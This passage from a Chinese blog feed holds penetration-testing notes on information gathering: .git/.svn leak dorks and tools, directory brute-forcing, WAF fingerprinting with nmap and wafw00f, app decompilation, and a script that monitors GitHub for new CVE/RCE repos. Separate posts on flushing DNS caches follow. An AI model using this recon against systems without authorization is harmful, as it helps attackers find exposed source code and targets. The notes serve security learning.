style="zoom: 33%;" /><p>类似的，我们可以在GitHub上搜索诸多特征</p></blockquote></blockquote><h2 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h2><blockquote><p>成因及危害：当前大量开发人员使用git进行版本控制，对网站进行自动部署。如果配置不当，可能会将.git文件部署到线上环境，这就引起了git泄露漏洞。在网站安全维护方面，git和svn信息泄露，是非常常见也是非常致命的漏洞。会导致整个网站的源码泄露。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注入等web安全漏洞。</p></blockquote><blockquote><p>防护方法：在部署的时候，对.git文件夹进行删除；也可以在nginx配置中，对.git目录的访问进行屏蔽。</p></blockquote><blockquote><p><strong>操作：</strong></p><p><code>&quot;.git&quot; intitle:&quot;index of&quot;</code><br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p></blockquote><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title=".svn泄露"></a>.svn泄露</h2><blockquote><p>跟git一样，都是用来版本迭代的一个功能。具体一点就是使用svn checkout功能来更新代码。<br>如果没有将.svn版本控制的目录进行删除，恶意用户就可以使用这个目录下的文件，来恢复源码。从而可以获取如数据库密码，源码漏洞等信息。</p></blockquote><blockquote><p>防护：在部署的时候，将该文件进行删除</p></blockquote><blockquote><p><strong>操作：</strong></p><p><code>&quot;.svn&quot; intitle:&quot;index of&quot;</code><br><a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a></p></blockquote><h2 id="网站备份文件"><a href="#网站备份文件" class="headerlink" title="网站备份文件"></a>网站备份文件</h2><blockquote><p>网站备份文件泄露指管理员误将网站备份文件或是敏感信息文件存放在某个网站目录下。<br><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p></blockquote><h2 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h2><blockquote><p>外部黑客可通过暴力破解文件名等方法下载该备份文件，导致网站敏感信息泄露。</p><ul><li>dirsearch：</li></ul><blockquote><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u target</span><br></pre></td></tr></table></figure></blockquote><ul><li>dirmap：</li></ul><blockquote><p><a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p></blockquote><ul><li>御剑后台扫描工具</li><li>kali下面也有不少自带的</li></ul><blockquote><p>比较好用的是dirb</p></blockquote></blockquote><h2 id="网站WAF识别"><a href="#网站WAF识别" class="headerlink" title="网站WAF识别"></a>网站WAF识别</h2><h3 id="WAF定义"><a href="#WAF定义" class="headerlink" title="WAF定义"></a>WAF定义</h3><blockquote><p>WAF ，即： Web Application FireWall （Web应用防火墙）。可以通俗的理解为：用于保护网站，防黑客、防网络攻击的安全防护系统；是最有效、最直接的Web安全防护产品。</p></blockquote><h3 id="WAF功能"><a href="#WAF功能" class="headerlink" title="WAF功能"></a>WAF功能</h3><blockquote><ol><li>防止常见的各类网络攻击，如：SQL注入、XSS跨站、CSRF、网页后门等；</li><li>防止各类自动化攻击，如：暴力破解、撞库、批量注册、自动发贴等；</li><li>阻止其它常见威胁，如：爬虫、0 DAY攻击、代码分析、嗅探、数据篡改、越权访问、敏感信息泄漏、应用层DDOS、远程恶意包含、盗链、越权、扫描等</li></ol></blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><blockquote><p>有waf的话，最好还是别用工具去扫，不然直接被banIP就不好了</p><p>一般存在waf的网站头部中大概率有：<strong>X-Powered-By: WAF</strong></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260240757.png" alt="image-20221026024027366"></p></blockquote><ul><li>wafw00f—-好用</li></ul><blockquote><p>偶尔存在误报和识别不出</p></blockquote><blockquote><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p></blockquote><ul><li>nmap</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –p80,443 --script http-waf-detect ip</span><br><span class="line">nmap –p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></figure><ul><li>看图识waf,常见WAF拦截页面总结：</li></ul><blockquote><p><a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</a></p></blockquote><h1 id="APP及其他资产信息收集"><a href="#APP及其他资产信息收集" class="headerlink" title="APP及其他资产信息收集"></a>APP及其他资产信息收集</h1><p>在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集，从而开展后续渗透。那么其中的信息收集就尤为重要。、</p><h2 id="APP提取一键反编译提取"><a href="#APP提取一键反编译提取" class="headerlink" title="APP提取一键反编译提取"></a>APP提取一键反编译提取</h2><blockquote><p>使用反编译工具，尝试获取包了里的源码，但是这种情况往往不完全，需要配合抓包</p><p>反编译出来的文件不一定看得懂，主要关注提取出来的url</p><blockquote><p>逍遥模拟器<a href="http://www.xyaz.cn/">http://www.xyaz.cn</a> </p><p>漏了个大洞<a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg%E6%8F%90%E5%8F%96%E7%A0%81">https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg提取码</a>: 0b7b</p><p>该工具直接逆向尝试提取出app中的文件</p></blockquote></blockquote><h2 id="APP抓数据包进行工具配合"><a href="#APP抓数据包进行工具配合" class="headerlink" title="APP抓数据包进行工具配合"></a>APP抓数据包进行工具配合</h2><blockquote><p>使用burp suite设置代理，或者wireshark抓数据包，进行分析</p><p>利用burp历史抓更多URL</p><p><strong>注意</strong>：</p><p>使用burp代理模拟器时，提示证书错误，后将burp生成的证书导入后正常，导入时需要将.cer改成.der。</p></blockquote><h2 id="各种第三方应用相关探针技术"><a href="#各种第三方应用相关探针技术" class="headerlink" title="各种第三方应用相关探针技术"></a>各种第三方应用相关探针技术</h2><blockquote><ul><li><a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li><a href="https://fofa.so/">https://fofa.so/</a></li></ul></blockquote><h2 id="各种服务接口信息相关探针技术"><a href="#各种服务接口信息相关探针技术" class="headerlink" title="各种服务接口信息相关探针技术"></a>各种服务接口信息相关探针技术</h2><h2 id="逆向及抓包获取不了更多信息之后的其他思路"><a href="#逆向及抓包获取不了更多信息之后的其他思路" class="headerlink" title="逆向及抓包获取不了更多信息之后的其他思路"></a>逆向及抓包获取不了更多信息之后的其他思路</h2><blockquote><p>某IP无WEB框架或者服务下的第三方测试，意思就是当从IP获取不到网站信息时的<strong>思路</strong></p></blockquote><h4 id="各种端口一顿乱扫"><a href="#各种端口一顿乱扫" class="headerlink" title="各种端口一顿乱扫"></a>各种端口一顿乱扫</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 45.33.42.113</span><br></pre></td></tr></table></figure><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210261736607.png" alt="image-20221026173626075" style="zoom:33%;" /><h4 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210261734873.png" alt="image-20221026173407272" style="zoom: 33%;" /><h4 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210261735453.png" alt="image-20221026173524969" style="zoom: 33%;" /> <h4 id="各种接口一顿乱扫"><a href="#各种接口一顿乱扫" class="headerlink" title="各种接口一顿乱扫"></a>各种接口一顿乱扫</h4><h4 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h4><h4 id="C段查询"><a href="#C段查询" class="headerlink" title="C段查询"></a>C段查询</h4><h4 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h4><h4 id="备案查询："><a href="#备案查询：" class="headerlink" title="备案查询："></a>备案查询：</h4><blockquote><p>找网址，在ping出ip地址，再用黑暗引擎搜索内容</p></blockquote><h4 id="网站标题："><a href="#网站标题：" class="headerlink" title="网站标题："></a>网站标题：</h4><blockquote><p>用百度、谷歌搜索相关键网站   用xx&#x2F;robots.tex、或者检查-Network 抓包看内容，搜索域名关键字</p></blockquote><h1 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h1><h2 id="最新漏洞EXP和POC资讯"><a href="#最新漏洞EXP和POC资讯" class="headerlink" title="最新漏洞EXP和POC资讯"></a>最新漏洞EXP和POC资讯</h2><h3 id="EXP和POC监控"><a href="#EXP和POC监控" class="headerlink" title="EXP和POC监控"></a>EXP和POC监控</h3><blockquote><p>有时候，新出了CVE或者RCE，但你完全不知道，这款Github监控器就能帮助你第一时间获取漏洞详情,和漏洞EXP&#x2F;POC,并且发送到你的邮箱中.<a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a> </p></blockquote><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><blockquote><ul><li>便于收集整理最新exp或poc</li><li>便于发现相关测试目标的资产</li></ul><p>server酱，从服务器、路由器等设备上推消息到手机的工具：<a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a></p><p>GitHub项目监控地址：<a href="https://github.com/weixiao9188/wechat_push">https://github.com/weixiao9188/wechat_push</a></p><blockquote><p>#利用微信推送通用漏洞4.0<br>#XXX表示通过server酱获取的微信推送接口<br>#数据保存在当前路径下的olddata.csv<br>#当前代码运行需要预先安装numpy pandas requests库，一般anaconda的环境就行<br>#可以通过更改time_sleep设置爬取间隔时间<br>注：<br>github哪个api需要翻墙<br>如果一直什么都不输出说明是遇到重复数据了<br>代码运行的时候不要打开olddata.csv文件，否则会报错</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装依赖python3的</span></span><br><span class="line">pip3 install pandas</span><br><span class="line">pip3 install requests</span><br></pre></td></tr></table></figure><blockquote><p>脚本说明：</p><p>将<code>SendKey</code>改为自己（server酱上面找）的，第50行中改</p><p>需要监控的目标：</p><p>下面代码中<code>response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers)</code>，也就是32和33行，修改为自己需要监控的GitHub目标，比如说32行的<code>CVE-2022</code>，也就是2022年的漏洞信息</p><p>除了cve也可以监控资产关键字</p><p>如果报错了可能是api.github.com打不开，挂上代理试试</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Title: wechat push CVE-2020</span></span><br><span class="line"><span class="comment"># Date: 2020-5-9</span></span><br><span class="line"><span class="comment"># Exploit Author: weixiao9188</span></span><br><span class="line"><span class="comment"># Version: 4.0</span></span><br><span class="line"><span class="comment"># Tested on: Linux,windows</span></span><br><span class="line"><span class="comment"># coding:UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">time_sleep = <span class="number">20</span> <span class="comment">#每隔20秒爬取一次</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;</span>&#125;</span><br><span class="line">    <span class="comment">#判断文件是否存在</span></span><br><span class="line">    datas = []</span><br><span class="line">    response1=<span class="literal">None</span></span><br><span class="line">    response2=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;olddata.csv&quot;</span>):</span><br><span class="line">        <span class="comment">#如果文件存在则每次爬取10个</span></span><br><span class="line">        df = pd.read_csv(<span class="string">&quot;olddata.csv&quot;</span>, header=<span class="literal">None</span>)</span><br><span class="line">        datas = df.where(df.notnull(),<span class="literal">None</span>).values.tolist()<span class="comment">#将提取出来的数据中的nan转化为None</span></span><br><span class="line">        response1 = requests.get(url=<span class="string">&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;</span>,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">        response2 = requests.get(url=<span class="string">&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;</span>,</span><br><span class="line">                                 headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#不存在爬取全部</span></span><br><span class="line">        datas = []</span><br><span class="line">        response1 = requests.get(url=<span class="string">&quot;https://api.github.com/search/repositories?q=CVE-2022&amp;sort=updated&amp;order=desc&quot;</span>,headers=headers)</span><br><span class="line">        response2 = requests.get(url=<span class="string">&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> [data1[<span class="string">&quot;items&quot;</span>],data2[<span class="string">&quot;items&quot;</span>]]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> j:</span><br><span class="line">            s = &#123;<span class="string">&quot;name&quot;</span>:i[<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;html&quot;</span>:i[<span class="string">&#x27;html_url&#x27;</span>],<span class="string">&quot;description&quot;</span>:i[<span class="string">&#x27;description&#x27;</span>]&#125;</span><br><span class="line">            s1 =[i[<span class="string">&#x27;name&#x27;</span>],i[<span class="string">&#x27;html_url&#x27;</span>],i[<span class="string">&#x27;description&#x27;</span>]]</span><br><span class="line">            <span class="keyword">if</span> s1 <span class="keyword">not</span> <span class="keyword">in</span> datas:</span><br><span class="line">                <span class="comment">#print(s1)</span></span><br><span class="line">                <span class="comment">#print(datas)</span></span><br><span class="line">                params = &#123;</span><br><span class="line">                     <span class="string">&quot;text&quot;</span>:s[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">                    <span class="string">&quot;desp&quot;</span>:<span class="string">&quot; 链接:&quot;</span>+<span class="built_in">str</span>(s[<span class="string">&quot;html&quot;</span>])+<span class="string">&quot;\n简介&quot;</span>+<span class="built_in">str</span>(s[<span class="string">&quot;description&quot;</span>])</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;当前推送为&quot;</span>+<span class="built_in">str</span>(s)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(params)</span><br><span class="line">                requests.get(<span class="string">&quot;https://sc.ftqq.com/XXXX.send&quot;</span>,params=params,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="comment">#time.sleep(1)#以防推送太猛</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;推送完成!&quot;</span>)</span><br><span class="line">                datas.append(s1)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#print(&quot;数据已处在!&quot;)</span></span><br><span class="line">    pd.DataFrame(datas).to_csv(<span class="string">&quot;olddata.csv&quot;</span>,header=<span class="literal">None</span>,index=<span class="literal">None</span>)</span><br><span class="line">    time.sleep(time_sleep)</span><br></pre></td></tr></table></figure><h2 id="网络空间搜索引擎使用要点"><a href="#网络空间搜索引擎使用要点" class="headerlink" title="网络空间搜索引擎使用要点"></a>网络空间搜索引擎使用要点</h2><blockquote><p>主要是注意查询语法 不过在网站里都会有提示</p></blockquote><blockquote><p><a href="https://fofa.info/">https://fofa.info/</a><br><code>domain=&quot;hetianlab.com&quot;</code></p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><code>site:&quot;hetianlab.com&quot;</code></p><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br><code>domain=&quot;hetianlab.com&quot;</code></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><code>hostname:baidu.com</code></p></blockquote><h2 id="微信公众号接口获取"><a href="#微信公众号接口获取" class="headerlink" title="微信公众号接口获取"></a>微信公众号接口获取</h2><h2 id="内部群-内部应用内部接口"><a href="#内部群-内部应用内部接口" class="headerlink" title="内部群 内部应用内部接口"></a>内部群 内部应用内部接口</h2><blockquote><p>社工啦，去QQ微信搜关键词找群</p></blockquote><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><blockquote><p>以后有时间自己敲一遍思维导图</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1620874266202-327332a0-50de-4677-ba44-544976b61043.png?x-oss-process=image/resize,w_1012,limit_0" alt="信息收集.png"></p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/miaodaren/p/7904484.html">https://www.cnblogs.com/miaodaren/p/7904484.html</a></li><li><a href="https://www.cnblogs.com/miaodaren/p/9177379.html">https://www.cnblogs.com/miaodaren/p/9177379.html</a></li><li><a href="https://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html">https://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html</a></li><li><a href="https://www.yuque.com/gemaxianrenhm/hahwdw/he2ore">信息收集-架构,搭建,WAF等 · 语雀 (yuque.com)</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统DNS缓存</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FDNS%E7%BC%93%E5%AD%98.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FDNS%E7%BC%93%E5%AD%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="查看操作系统DNS缓存"><a href="#查看操作系统DNS缓存" class="headerlink" title="查看操作系统DNS缓存"></a>查看操作系统DNS缓存</h1><p>OS缓存会参考DNS服务器响应的TTL值，但是不完全等于TTL值。</p><h2 id="Windows查看电脑DNS缓存信息的方法"><a href="#Windows查看电脑DNS缓存信息的方法" class="headerlink" title="Windows查看电脑DNS缓存信息的方法"></a>Windows查看电脑DNS缓存信息的方法</h2><p>&amp;#x20;Windows系统默认开启DNS缓存服务，叫做DNSClient，可以缓存一些常用的域名。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns #这个命令可以展示现在你电脑已经缓存的域名</span><br></pre></td></tr></table></figure><h2 id="Linux-DNS缓存"><a href="#Linux-DNS缓存" class="headerlink" title="Linux DNS缓存"></a>Linux DNS缓存</h2><p>ubuntu服务器一般默认安装nscd，nscd（Name Service Cache Daemon）是一种能够缓存 passwd、group、hosts 的本地缓存服务，分别对应三个源 &#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;hosts、&#x2F;etc&#x2F;resolv.conf。其最为明显的作用就是加快 DNS 解析速度，在接口调用频繁的内网环境建议开启。</p><p>首先查看nscd服务是否开启</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ps -e |grep nscd</span><br></pre></td></tr></table></figure><p>nscd 默认配置文件位置 <code>/etc/nscd.conf</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 日志文件</span></span><br><span class="line"><span class="comment">#logfile        /var/log/nscd.log</span></span><br><span class="line"><span class="comment"># 调试级别</span></span><br><span class="line">debug-level     5</span><br><span class="line"><span class="comment"># 等待请求的线程数</span></span><br><span class="line">threads         6</span><br><span class="line"><span class="comment"># 最大线程数</span></span><br><span class="line">max-threads     128</span><br><span class="line"><span class="comment"># 运行用户</span></span><br><span class="line">server-user     nscd</span><br><span class="line">paranoia        no</span><br><span class="line"><span class="comment"># 禁用passwd缓存</span></span><br><span class="line">enable-cache    passwd      no</span><br><span class="line"><span class="comment"># 禁用group缓存</span></span><br><span class="line">enable-cache    group       no</span><br><span class="line"><span class="comment"># 启用hosts缓存</span></span><br><span class="line">enable-cache    hosts       <span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 指定缓存命中项的TTL，单位为s</span></span><br><span class="line">positive-time-to-live   hosts   5</span><br><span class="line"><span class="comment"># 指定缓存未命中项的TTL，单位为s</span></span><br><span class="line">negative-time-to-live   hosts       20</span><br><span class="line"><span class="comment"># 散列表大小</span></span><br><span class="line">suggested-size  hosts       211</span><br><span class="line"><span class="comment"># 启用hosts文件的修改情况检查</span></span><br><span class="line">check-files     hosts       <span class="built_in">yes</span></span><br><span class="line">persistent      hosts       <span class="built_in">yes</span></span><br><span class="line">shared          hosts       <span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 最大缓存库大小</span></span><br><span class="line">max-db-size     hosts       33554432</span><br></pre></td></tr></table></figure><p>通过service nscd start开启</p><p>查看nscd dns缓存列表</p><p>想添加dns缓存，可以修改本地hosts 在&#x2F;etc&#x2F;hosts，保存</p><p>通过下面命令查询，是否缓存到本地dns列表</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nscd -f hosts</span><br></pre></td></tr></table></figure><h1 id="清除操作系统缓存"><a href="#清除操作系统缓存" class="headerlink" title="清除操作系统缓存"></a>清除操作系统缓存</h1><h2 id="在-Windows-上清除-x2F-刷新-DNS-缓存"><a href="#在-Windows-上清除-x2F-刷新-DNS-缓存" class="headerlink" title="在 Windows 上清除&#x2F;刷新 DNS 缓存"></a>在 Windows 上清除&#x2F;刷新 DNS 缓存</h2><p>对于所有 Windows 版本，清除 DNS 缓存的过程都是相同的。你需要使用管理员权限打开命令提示符并运行 ：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><h2 id="在-Linux-上清除-x2F-刷新-DNS-缓存"><a href="#在-Linux-上清除-x2F-刷新-DNS-缓存" class="headerlink" title="在 Linux 上清除&#x2F;刷新 DNS 缓存"></a>在 Linux 上清除&#x2F;刷新 DNS 缓存</h2><p>在 Linux 上，除非已安装并运行诸如 Systemd-Resolved，DNSMasq 或 Nscd 之类的缓存服务，否则没有操作系统级 DNS 缓存。根据 Linux 发行版和所使用的缓存服务，清除 DNS 缓存的过程有所不同。</p><h3 id="系统化解决"><a href="#系统化解决" class="headerlink" title="系统化解决"></a>系统化解决</h3><p>大多数现代 Linux 发行版，例如 Ubuntu 18.04，都使用 systemd 解析的服务来缓存 DNS 条目。</p><p>要查找服务是否正在运行，请运行：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl is-active systemd-resolved.service</span><br></pre></td></tr></table></figure><p>如果该服务正在运行，则将打印命令 active，否则将看到 inactive。</p><p>要清除系统解析的 DNS 缓存，你需要键入以下命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemd-resolve --flush-caches</span><br></pre></td></tr></table></figure><p>成功后，该命令不会返回任何消息。</p><h3 id="Dnsmasq"><a href="#Dnsmasq" class="headerlink" title="Dnsmasq"></a>Dnsmasq</h3><p>Dnsmasq 是轻量级的 DHCP 和 DNS 缓存名称服务器。</p><p>如果你的系统使用 DNSMasq 作为缓存服务器，则要清除 DNS 缓存，需要重新启动 Dnsmasq 服务：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl restart dnsmasq.service</span><br><span class="line"><span class="comment">#或者 </span></span><br><span class="line">service dnsmasq restart</span><br></pre></td></tr></table></figure><h3 id="NSCD"><a href="#NSCD" class="headerlink" title="NSCD"></a>NSCD</h3><p>NSCD 是一个缓存守护程序，它是大多数基于 RedHat 的发行版的首选 DNS 缓存系统。</p><p>如果系统使用 NSCD 来清除 DNS 缓存，则需要重新启动 NSCD 服务：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">清除缓存</span><br><span class="line">1.    nscd -i passwd</span><br><span class="line">2.    nscd -i group</span><br><span class="line">3.    nscd -i hosts</span><br><span class="line">除了上面的方法，重启nscd服务同样可以达到清理cache的目的。</span><br><span class="line">$ sudo systemctl restart nscd.service</span><br><span class="line">或者</span><br><span class="line">$ sudo service nscd restart</span><br></pre></td></tr></table></figure><h2 id="在-MacOS-上清除-x2F-刷新-DNS-缓存"><a href="#在-MacOS-上清除-x2F-刷新-DNS-缓存" class="headerlink" title="在 MacOS 上清除&#x2F;刷新 DNS 缓存"></a>在 MacOS 上清除&#x2F;刷新 DNS 缓存</h2><p>根据你所运行的版本，在 MacOS 中刷新缓存的命令略有不同。该命令必须以具有系统管理员特权的用户（sudo 用户）身份运行。</p><p>要清除 MacOS 中的 DNS 缓存，请执行以下步骤：</p><ol><li>打开查找器。</li><li>转到应用程序&gt;实用程序&gt;终端。这将打开终端窗口。</li><li>在命令行中，输入以下行，然后按回车：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo killall -HUP mDNSResponder</span><br></pre></td></tr></table></figure><p>输入你的 sudo 密码，然后再次按回车。成功后，系统不会返回任何消息。</p><p>对于早期版本的 MacOS，刷新缓存的命令不同。</p><ul><li>MacOS 版本 10.11 和 10.9</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo dscacheutil -flushcache</span><br><span class="line">$ sudo killall -HUP mDNSResponder</span><br></pre></td></tr></table></figure><ul><li>MacOS 版本 10.10</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo discoveryutil mdnsflushcache</span><br><span class="line">$ sudo discoveryutil udnsflushcaches</span><br></pre></td></tr></table></figure><ul><li>MacOS 版本 10.6 和 10.5</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
          <category> DNS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器DNS缓存</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%B5%8F%E8%A7%88%E5%99%A8DNS%E7%BC%93%E5%AD%98.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%B5%8F%E8%A7%88%E5%99%A8DNS%E7%BC%93%E5%AD%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="查看浏览器DNS缓存"><a href="#查看浏览器DNS缓存" class="headerlink" title="查看浏览器DNS缓存"></a>查看浏览器DNS缓存</h1><p>浏览器DNS缓存：首先，浏览器DNS缓存的时间跟DNS服务器返回的TTL值无关。浏览器在获取网站域名的实际IP地址后会对其IP进行缓存，减少网络请求的损耗。每种浏览器都有一个固定的DNS缓存时间，如Chrome的过期时间是1分钟，在这个期限内不会重新请求DNS。</p><h2 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h2><p>如何查看chrome浏览器的DNS缓存<a href="https://www.jianshu.com/p/9e7aa4ec4b46">https://www.jianshu.com/p/9e7aa4ec4b46</a></p><p>Chrome：为了加快访问速度，Google Chrome浏览器采用了预提DNS记录，在本地建立DNS缓存的方法，默认，Chrome对每个域名会默认缓存60s</p><ol><li>首先，网上搜到的在chrome:&#x2F;&#x2F;net-internals&#x2F;#dns 里面并看不到，只能清除。清除的话，需要点击 Clear host cache</li><li>如果想要查看的话，需要在chrome:&#x2F;&#x2F;net-export页面点击 Start Logging to Disk</li><li>保存 chrome-net-export-log.json 文件</li><li>点击Stop Logging</li><li>打开<a href="https://netlog-viewer.appspot.com/#import">https://netlog-viewer.appspot.com/#import</a>，导入上面保存的chrome-net-export-log.json 文件。然后就可以看到下面的DNS缓存了</li></ol><p>试过是可以的</p><h2 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h2><p>Firefox：Firefox也有dns缓存功能，但是默认缓存时间只有1分钟，可以通过修改该默认值加快DNS解析速度，方法如下：打开一个新的窗口，地址栏输 入 about:config，回车，进入设置界面。然后搜索 network.dnsCacheExpiration，把原来的60改成 6000（表示缓存6000秒），再搜索network.dnsCacheEntries 把默认的20改成1000（表示缓存1000条）。如果没 有上面两个项目，新建它们即可，新建条目类型为整数型。 